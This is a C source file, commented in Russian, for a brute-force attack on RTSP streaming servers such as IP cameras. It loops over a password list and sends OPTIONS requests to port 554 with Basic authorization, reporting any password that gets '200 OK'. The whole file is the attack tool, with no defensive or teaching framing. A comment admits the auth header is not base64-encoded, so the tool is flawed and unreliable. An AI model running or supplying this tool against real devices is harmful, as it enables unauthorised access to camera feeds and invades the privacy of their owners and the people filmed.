#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 2048
#define PASSWORD_LENGTH 100

void rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Ошибка создания сокета");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        printf("[-] Неверный IP-адрес: %s\n", target_ip);
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Ошибка подключения");
        close(sock);
        return;
    }

    // Важно: Base64 обычно нужен для авторизации, а не просто username:password
    // Мы делаем обычную отправку без base64, что может не пройти авторизацию
    snprintf(request, sizeof(request),
             "OPTIONS rtsp://%s/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic %s:%s\r\n\r\n",
             target_ip, username, password);
    send(sock, request, strlen(request), 0);

    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    if (bytes_received > 0) {
        response[bytes_received] = '\0';

        if (strstr(response, "200 OK") != NULL) {
            printf("\033[1;32m[+] Успешный пароль: %s\033[0m\n", password);
        } else {
            printf("\033[1;31m[-] Неверный пароль: %s\033[0m\n", password);
        }
    } else {
        printf("[-] Нет ответа от сервера\n");
    }

    close(sock);
}

int main() {
    char target_ip[32];
    int target_port = 554;
    char username[100];
    char **passwords = NULL;
    int password_count = 0;
    int capacity = 10;

    passwords = malloc(capacity * sizeof(char *));
    if (!passwords) {
        perror("Ошибка выделения памяти");
        return 1;
    }

    FILE *file = fopen("passwords.txt", "r");
    if (!file) {
        perror("Не удалось открыть файл passwords.txt");
        free(passwords);
        return 1;
    }

    char buffer[PASSWORD_LENGTH];
    while (fgets(buffer, PASSWORD_LENGTH, file)) {
        buffer[strcspn(buffer, "\n")] = 0;
        if (password_count >= capacity) {
            capacity *= 2;
            passwords = realloc(passwords, capacity * sizeof(char *));
            if (!passwords) {
                perror("Ошибка realloc");
                fclose(file);
                return 1;
            }
        }
        passwords[password_count] = strdup(buffer);
        if (!passwords[password_count]) {
            perror("Ошибка strdup");
            fclose(file);
            return 1;
        }
        password_count++;
    }
    fclose(file);

    printf("Введите IP-адрес RTSP сервера: ");
    scanf("%31s", target_ip);

    printf("Введите логин (по умолчанию admin): ");
    scanf("%99s", username);

    printf("Начинаю перебор паролей для %s@%s:%d\n", username, target_ip, target_port);

    for (int i = 0; i < password_count; i++) {
        rtsp_bruteforce(target_ip, target_port, username, passwords[i]);
        free(passwords[i]);
    }

    free(passwords);
    return 0;
}
